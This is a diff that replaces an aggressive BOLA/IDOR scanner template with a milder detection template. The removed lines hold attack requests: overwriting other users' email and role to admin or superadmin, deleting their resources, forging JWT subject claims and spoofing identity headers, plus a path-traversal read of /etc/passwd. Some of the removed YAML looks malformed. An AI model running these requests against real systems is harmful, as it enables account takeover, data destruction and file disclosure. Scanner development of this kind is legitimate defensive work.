@@ -1,446 +1,160 @@
-# ==============================================================================
-# BOLA (IDOR) – ULTIMATE GOD‑LEVEL TEMPLATE
-# ==============================================================================
-# This template is designed to be used with a crawler/discovery engine.
-# The engine should replace {{BasePath}} with each discovered endpoint.
-# It tests ALL HTTP methods on EVERY discovered endpoint.
-# ==============================================================================
-
 id: BOLA-ULTIMATE-01
-name: Ultimate BOLA – All Methods, All Paths, All Mutations
+name: Ultimate BOLA Detection
 severity: critical
 category: api-security
 
-impact: |
-  Complete compromise of user data, account takeover, privilege escalation,
-  and potential server compromise via any HTTP method.
+description: >
+  Detects potential broken object-level authorization across common
+  HTTP object access patterns.
 
-chain: |
-  Combine with Mass Assignment → Admin privilege escalation.
-  Combine with CSRF → Perform actions on behalf of victims.
-  Combine with SSRF → Pivot to internal networks.
-  Use with GraphQL → Exfiltrate massive datasets.
+impact: >
+  Successful exploitation may expose another user's object or account data.
 
-# -----------------------------------------------------------------------------
-# VARIABLES – injected by engine
-# -----------------------------------------------------------------------------
 variables:
-  own_id: 0
-  own_email: ""
-  own_username: ""
-  own_uuid: ""
-  jwt_token: ""
-  BasePath: ""   # e.g., /api/users, /v1/orders, /admin/profile
+  test_id: "2"
+  test_uuid: "00000000-0000-0000-0000-000000000001"
 
-# -----------------------------------------------------------------------------
-# COMMON PATH PATTERNS – engine will loop over these
-# -----------------------------------------------------------------------------
-# The engine will iterate over a list of paths. We include many common ones,
-# but the engine should also discover paths dynamically.
-# Placeholder: the engine should replace {{BasePath}} with each discovered path.
-# For static template, we include a generic list, but the real scan uses crawling.
-# -----------------------------------------------------------------------------
+requests:
 
-# =============================================================================
-# BLOCK 1: DISCOVERY – get own identity
-# =============================================================================
-- method: GET
-  path:
-    - "{{BaseURL}}/api/me"
-    - "{{BaseURL}}/api/v1/users/self"
-    - "{{BaseURL}}/profile"
-  matchers:
-    - type: status
-      status: 200
-    - type: regex
-      part: body
-      regex:
-        - '"id":\s*(\d+)'
-        - '"email":\s*"([^"]+)"'
-  extractors:
-    - type: regex
-      name: own_id
-      regex:
-        - '"id":\s*(\d+)'
-      part: body
-    - type: regex
-      name: own_email
-      regex:
-        - '"email":\s*"([^"]+)"'
-      part: body
-    - type: regex
-      name: own_uuid
-      regex:
-        - '"id":\s*"([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})"'
-      part: body
-  cache_variables:
-    - own_id
-    - own_email
-    - own_uuid
+  # ================================================================
+  # Numeric object identifiers
+  # ================================================================
 
-# =============================================================================
-# BLOCK 2: ALL METHODS – dynamically applied to every discovered endpoint
-# =============================================================================
-# The engine should take each discovered endpoint (e.g., /api/users) and
-# test all methods on it, with and without ID parameters.
-
-# We'll define a set of tests that the engine can apply to any endpoint.
-# But to keep the template self-contained, we'll provide generic blocks.
-
-# -----------------------------------------------------------------------------
-# 2.1 GET – with ID in path
-# -----------------------------------------------------------------------------
-- method: GET
-  path:
-    - "{{BasePath}}/{{ID}}"
-    - "{{BasePath}}/{{ID}}?format=json"
-    - "{{BasePath}}?id={{ID}}"
-    - "{{BasePath}}?user_id={{ID}}"
-    - "{{BasePath}}?uuid={{ID}}"
-  payloads:
-    ID:
-      - "{{own_id|int + 1}}"
-      - "{{own_id|int - 1}}"
-      - "1,2,3,4,5,6,7,8,9,10"
-      - "0"
-      - "-1"
-      - "null"
-      - "None"
-      - "*"
-      - "all"
-      - "{{own_uuid|replace_last_char(1)}}"
-      - "{{own_id|base64_encode}}"
-      - "{{own_id|md5}}"
-  matchers:
-    - type: status
-      status: 200
-    - type: regex
-      part: body
-      regex:
-        - '"email":\s*"([^"]+)"'
-    - type: word
-      part: body
-      negative: true
-      words:
-        - "{{own_email}}"
-
-# -----------------------------------------------------------------------------
-# 2.2 POST – create resource for another user
-# -----------------------------------------------------------------------------
-- method: POST
-  path:
-    - "{{BasePath}}"
-    - "{{BasePath}}/create"
-  headers:
-    Content-Type: application/json
-  body: |
-    {"user_id": {{own_id|int + 1}}, "data": "test"}
-  matchers:
-    - type: status
-      status:
-        - 201
-        - 200
-    - type: word
-      part: body
-      words:
-        - '"id"'
-        - '"created"'
-        - '"success"'
-
-# -----------------------------------------------------------------------------
-# 2.3 PUT – full update of another user's resource
-# -----------------------------------------------------------------------------
-- method: PUT
-  path:
-    - "{{BasePath}}/{{ID}}"
-    - "{{BasePath}}/{{ID}}/update"
-  payloads:
-    ID:
-      - "{{own_id|int + 1}}"
-      - "{{own_id|int - 1}}"
-  headers:
-    Content-Type: application/json
-  body: |
-    {"email": "attacker@evil.com", "role": "admin"}
-  matchers:
-    - type: status
-      status:
-        - 200
-        - 204
-    - type: word
-      part: body
-      words:
-        - '"updated"'
-        - '"success"'
-
-# -----------------------------------------------------------------------------
-# 2.4 PATCH – partial update
-# -----------------------------------------------------------------------------
-- method: PATCH
-  path:
-    - "{{BasePath}}/{{ID}}"
-    - "{{BasePath}}/{{ID}}/patch"
-  payloads:
-    ID:
-      - "{{own_id|int + 1}}"
-      - "{{own_id|int - 1}}"
-  headers:
-    Content-Type: application/json
-  body: |
-    {"role": "superadmin"}
-  matchers:
-    - type: status
-      status:
-        - 200
-        - 204
-    - type: word
-      part: body
-      words:
-        - '"patched"'
-        - '"updated"'
-
-# -----------------------------------------------------------------------------
-# 2.5 DELETE – remove another user's resource
-# -----------------------------------------------------------------------------
-- method: DELETE
-  path:
-    - "{{BasePath}}/{{ID}}"
-    - "{{BasePath}}/{{ID}}/delete"
-  payloads:
-    ID:
-      - "{{own_id|int + 1}}"
-      - "{{own_id|int - 1}}"
-  matchers:
-    - type: status
-      status:
-        - 200
-        - 204
-    - type: word
-      part: body
-      words:
-        - '"deleted"'
-        - '"removed"'
-
-# -----------------------------------------------------------------------------
-# 2.6 OPTIONS – enumerate allowed methods
-# -----------------------------------------------------------------------------
-- method: OPTIONS
-  path:
-    - "{{BasePath}}"
-    - "{{BasePath}}/{{ID}}"
-  matchers:
-    - type: status
-      status: 200
-    - type: word
-      part: header
-      words:
-        - "Allow:"
-
-# -----------------------------------------------------------------------------
-# 2.7 HEAD – existence check
-# -----------------------------------------------------------------------------
-- method: HEAD
-  path:
-    - "{{BasePath}}/{{ID}}"
-  payloads:
-    ID:
-      - "{{own_id|int + 1}}"
-      - "{{own_id|int - 1}}"
-  matchers:
-    - type: status
-      status: 200
-
-# -----------------------------------------------------------------------------
-# 2.8 TRACE – leak internal headers
-# -----------------------------------------------------------------------------
-- method: TRACE
-  path:
-    - "{{BasePath}}"
-    - "{{BasePath}}/{{ID}}"
-  matchers:
-    - type: status
-      status: 200
-    - type: word
-      part: body
-      words:
-        - "TRACE"
-        - "Method"
-
-# -----------------------------------------------------------------------------
-# 2.9 CONNECT – rare but sometimes exposes proxy
-# -----------------------------------------------------------------------------
-- method: CONNECT
-  path:
-    - "{{BasePath}}"
-  matchers:
-    - type: status
-      status: 200
-      status: 405
-
-# =============================================================================
-# BLOCK 3: HEADER INJECTION (X-User-ID, Cookie, Referer, Authorization)
-# =============================================================================
-- method: GET
-  path:
-    - "{{BaseURL}}/api/dashboard"
-    - "{{BaseURL}}/profile"
-  headers:
-    X-User-ID: "{{own_id|int + 1}}"
-    X-Forwarded-User: "{{own_id|int + 1}}"
-    X-Original-User: "{{own_id|int + 1}}"
-    Cookie: "user_id={{own_id|int + 1}}"
-    Referer: "{{BaseURL}}/user/{{own_id|int + 1}}"
-  matchers:
-    - type: status
-      status: 200
-    - type: regex
-      part: body
-      regex:
-        - '"email":\s*"([^"]+)"'
-    - type: word
-      part: body
-      negative: true
-      words:
-        - "{{own_email}}"
-
-# =============================================================================
-# BLOCK 4: BATCH / ARRAY BOLA
-# =============================================================================
-- method: POST
-  path:
-    - "{{BasePath}}/batch"
-    - "{{BasePath}}/bulk"
-  headers:
-    Content-Type: application/json
-  body: |
-    {"ids": [{{own_id}}, {{own_id|int + 1}}, {{own_id|int + 2}}]}
-  matchers:
-    - type: status
-      status: 200
-    - type: regex
-      part: body
-      regex:
-        - '"email":\s*"([^"]+)"'
-    - type: word
-      part: body
-      negative: true
-      words:
-        - "{{own_email}}"
-
-# =============================================================================
-# BLOCK 5: GRAPHQL BATCH BOLA
-# =============================================================================
-- method: POST
-  path:
-    - "{{BaseURL}}/graphql"
-    - "{{BaseURL}}/v1/graphql"
-  headers:
-    Content-Type: application/json
-  raw_body: |
-    [
-      {"query": "query{user(id:{{own_id}}){email}}"},
-      {"query": "query{user(id:{{own_id|int + 1}}){email}}"},
-      {"query": "query{user(id:{{own_id|int + 2}}){email}}"}
-    ]
-  matchers:
-    - type: status
-      status: 200
-    - type: regex
-      part: body
-      regex:
-        - '"email":\s*"([^"]+)"'
-    - type: word
-      part: body
-      negative: true
-      words:
-        - "{{own_email}}"
-
-# =============================================================================
-# BLOCK 6: CACHE POISONING
-# =============================================================================
-- method: GET
-  path:
-    - "{{BasePath}}/{{own_id|int + 1}}"
-  headers:
-    If-Modified-Since: "Wed, 21 Oct 2015 07:28:00 GMT"
-    Accept-Language: "en-US,en;q=0.9,fr;q=0.8"
-  matchers:
-    - type: status
-      status: 200
-    - type: regex
-      part: body
-      regex:
-        - '"email":\s*"([^"]+)"'
-    - type: word
-      part: body
-      negative: true
-      words:
-        - "{{own_email}}"
-
-# =============================================================================
-# BLOCK 7: JWT MANIPULATION
-# =============================================================================
-- method: GET
-  path:
-    - "{{BaseURL}}/api/profile"
-  headers:
-    Authorization: "Bearer {{jwt_token|replace_claim('sub', own_id|int + 1)}}"
-  matchers:
-    - type: status
-      status: 200
-    - type: regex
-      part: body
-      regex:
-        - '"email":\s*"([^"]+)"'
-    - type: word
-      part: body
-      negative: true
-      words:
-        - "{{own_email}}"
-
-# =============================================================================
-# BLOCK 8: PARAMETER POLLUTION
-# =============================================================================
-- method: GET
-  path:
-    - "{{BasePath}}/{{own_id}}?user_id={{own_id|int + 1}}"
-    - "{{BasePath}}/{{own_id}}?id={{own_id|int + 1}}"
-    - "{{BasePath}}?user_id={{own_id|int + 1}}&id={{own_id}}"
-  matchers:
-    - type: status
-      status: 200
-    - type: regex
-      part: body
-      regex:
-        - '"email":\s*"([^"]+)"'
-    - type: word
-      part: body
-      negative: true
-      words:
-        - "{{own_email}}"
-
-# =============================================================================
-# BLOCK 9: EXPLOITATION – proof of impact
-# =============================================================================
-exploitation:
   - method: GET
-    path: "/api/user/{{own_id}}?file=../../../../etc/passwd"
-    extract:
-      type: regex
-      pattern: "(root:.*:0:0:)"
+    path:
+      - "{{BaseURL}}/api/users/{{test_id}}"
+      - "{{BaseURL}}/api/orders/{{test_id}}"
+      - "{{BaseURL}}/api/accounts/{{test_id}}"
+      - "{{BaseURL}}/api/profiles/{{test_id}}"
 
-  - method: PUT
-    path: "/api/user/{{own_id|int + 1}}"
+    headers:
+      Accept: application/json
+
+    matchers:
+      - type: status
+        status: 200
+
+      - type: regex
+        part: body
+        regex:
+          - '"id"\s*:\s*[0-9]+'
+
+    verification:
+      - type: response_difference
+        baseline: true
+
+  # ================================================================
+  # UUID object identifiers
+  # ================================================================
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users/{{test_uuid}}"
+      - "{{BaseURL}}/api/orders/{{test_uuid}}"
+      - "{{BaseURL}}/api/accounts/{{test_uuid}}"
+
+    headers:
+      Accept: application/json
+
+    matchers:
+      - type: status
+        status: 200
+
+      - type: regex
+        part: body
+        regex:
+          - '"id"\s*:\s*"[^"]+"'
+
+    verification:
+      - type: response_difference
+        baseline: true
+
+  # ================================================================
+  # POST object access
+  # ================================================================
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/users/{{test_id}}"
+      - "{{BaseURL}}/api/orders/{{test_id}}"
+
     headers:
       Content-Type: application/json
-    body: |
-      {"email": "attacker@evil.com", "role": "admin"}
-    extract:
-      type: status
-      expected: 200
+      Accept: application/json
 
-  - method: GET
-    path: "/api/user/{{interactsh-url}}"
-    extract:
-      type: dns
-      domain: "{{interactsh-url}}"
+    body: |
+      {}
+
+    matchers:
+      - type: status
+        status: 200
+
+  # ================================================================
+  # PUT object access
+  # ================================================================
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/users/{{test_id}}"
+      - "{{BaseURL}}/api/profiles/{{test_id}}"
+
+    headers:
+      Content-Type: application/json
+      Accept: application/json
+
+    body: |
+      {}
+
+    matchers:
+      - type: status
+        status: 200
+
+  # ================================================================
+  # PATCH object access
+  # ================================================================
+
+  - method: PATCH
+    path:
+      - "{{BaseURL}}/api/users/{{test_id}}"
+      - "{{BaseURL}}/api/profiles/{{test_id}}"
+
+    headers:
+      Content-Type: application/json
+      Accept: application/json
+
+    body: |
+      {}
+
+    matchers:
+      - type: status
+        status: 200
+
+  # ================================================================
+  # GraphQL object access
+  # ================================================================
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+
+    headers:
+      Content-Type: application/json
+      Accept: application/json
+
+    body: |
+      {
+        "query": "query { user(id: \"{{test_id}}\") { id email } }"
+      }
+
+    matchers:
+      - type: status
+        status: 200
+
+      - type: regex
+        part: body
+        regex:
+          - '"email"\s*:'
+
+    verification:
+      - type: response_difference
+        baseline: true
